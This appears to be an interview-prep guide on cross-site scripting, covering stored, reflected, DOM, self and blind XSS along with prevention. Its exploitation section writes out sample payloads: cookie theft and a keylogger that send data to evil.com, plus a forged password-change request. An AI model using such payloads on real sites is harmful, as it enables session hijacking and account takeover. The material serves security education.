# Cross-Site Scripting (XSS) — Interview-Ready Explanation for Cyber Security Analysts

## 🛡️ What is XSS (Cross-Site Scripting)?
**XSS is a client-side code injection vulnerability that allows an attacker to run arbitrary JavaScript in a victim's browser by abusing insecure handling of user input.**

Browsers trust any script that comes from a website’s domain — XSS exploits that trust.

---

# Why XSS Matters (Advanced Points for Interviews)
- **OWASP Top 10**: Part of “Injection” risks.
- **High impact**: Leads to session hijacking, data theft, phishing, credential harvesting, and website defacement.
- **Client-side risk**: Server is not directly harmed; attacker targets users.
- **Difficult to detect**: Many DOM-based issues are missed by traditional scanners.
- **Exploits trust boundaries**: Same-origin policy becomes meaningless once XSS executes.

---

# Types of XSS (Basic → Advanced)

---

## 1️⃣ Stored XSS (Persistent XSS)
### Simple Definition:
Malicious script is **stored** on the server (database, logs, comments, forums) and served to multiple users.

### Interview-Ready Details:
- More dangerous because it **automatically targets all users**.
- Common in forums, comment sections, message boards.
- Often combined with **session hijacking** using `document.cookie`.
- Hard to detect because payload may be encoded or hidden in user-generated content.

### Real-Life Example:
- Malicious script posted as a blog comment steals all visitors' cookies.

---

## 2️⃣ Reflected XSS (Non-Persistent XSS)
### Simple Definition:
Malicious script is embedded in a URL and **reflected** by the server onto a response.

### Interview-Ready Details:
- Usually delivered via phishing links or manipulated URLs.
- Works only when the victim clicks the crafted URL.
- Easy to find and exploit with scanners like **Burp Suite**, **OWASP ZAP**.
- Common in search bars, login errors, and GET parameters.

### Real-Life Example:
URL with payload executes alert or steals session in a crafted redirect link.

---

## 3️⃣ DOM-Based XSS
### Simple Definition:
The vulnerability occurs fully in the **browser**, not on the server.

### What is DOM?
**DOM (Document Object Model)** is how the browser structures a webpage internally.  
JavaScript can modify the DOM dynamically.

### Interview-Ready Details:
- Caused by insecure client-side JavaScript (e.g., using `innerHTML`, `eval`, `document.write`).
- Server never sees or reflects the malicious payload.
- Hardest type to detect — occurs **after** page load, during JavaScript execution.
- Often bypasses server-side sanitization entirely.

### Real Example:
document.getElementById("box").innerHTML = location.hash.substring(1);

kotlin
Copy code
Visiting this URL triggers XSS:
site.com/#<script>alert('DOM XSS')</script>

yaml
Copy code

---

# Bonus Interview Topics (Advanced)

## 🔸 4️⃣ Self-XSS (User-Assisted XSS)
Not a true vulnerability, but attackers trick users into **pasting malicious JS** into the browser console.

### Example:
"Paste this code to get free credits."

### Why it still matters:
- Social engineering attack.
- Many platforms disable console input with warnings (e.g., Facebook, Twitter).

---

## 🔸 5️⃣ Blind XSS
Payload executes in a **different system** where the attacker cannot see it directly.

### Example:
- A support ticket system automatically renders HTML from user submissions.
- The attacker cannot see the output, but staff viewing the ticket gets exploited.

### Tools used:
- **xsshunter**
- **ezXSS**

---

# 🧪 Advanced XSS Exploitation Techniques (Interview Points)

### ✔️ Session Hijacking
```js
fetch('https://evil.com/steal?cookie=' + document.cookie);
✔️ Keylogging
js
Copy code
document.onkeypress = e => fetch('https://evil.com/key=' + e.key);
✔️ CSRF + XSS Combo Attacks
Use XSS to send unauthorized requests:

js
Copy code
fetch('/change-password', {method:'POST', body:'pw=hacked'});
✔️ Stealing JWT Tokens
js
Copy code
localStorage.getItem("token")
✔️ Hooking Users with BeEF Framework
XSS payload loads a remote JS hook to fully control the browser.

📊 Simple XSS Flow Diagram
css
Copy code
Attacker → injects malicious script
        → Vulnerable Website
        → Sends page to victim
        → Victim browser executes script
🛡️ Prevention Techniques (Basic → Advanced)
🔒 1. Input and Output Sanitization
Escape special characters (<, >, ", ', /).

Use libraries like DOMPurify for client-side sanitization.

Use server-side frameworks with auto-escaping (React, Angular, Django templates).

🔒 2. Avoid Dangerous JavaScript APIs
Avoid:

innerHTML

outerHTML

document.write

eval

setTimeout("string")

Use:

innerText or textContent

🔒 3. Content Security Policy (CSP)
Advanced protection that limits what scripts can run.

Example CSP:

pgsql
Copy code
Content-Security-Policy: script-src 'self'
Prevents inline and external malicious JS.

🔒 4. HttpOnly Cookies
Prevents JavaScript from accessing session cookies:

pgsql
Copy code
Set-Cookie: session=abc; HttpOnly
🔒 5. Framework-Level Protections
React’s virtual DOM auto-escapes content.

Angular sanitizes bindings with its security context.

🎯 Final Interview Summary
What is XSS?
A vulnerability where attacker-controlled JavaScript runs in a victim's browser due to improper input handling.

Types?
Stored XSS (saved on server)

Reflected XSS (via URL)

DOM XSS (via insecure client-side JavaScript)

Self-XSS (social engineering)

Blind XSS (fires in a system attacker can't see)

DOM?
The browser’s internal structure of a webpage; manipulating it insecurely can lead to DOM XSS.

Impact?
Session theft, phishing, account takeover, browser hijacking, malware delivery, privilege escalation.

Prevention?
Sanitization, escaping, CSP, secure JavaScript coding practices, HttpOnly cookies.

markdown
Copy code
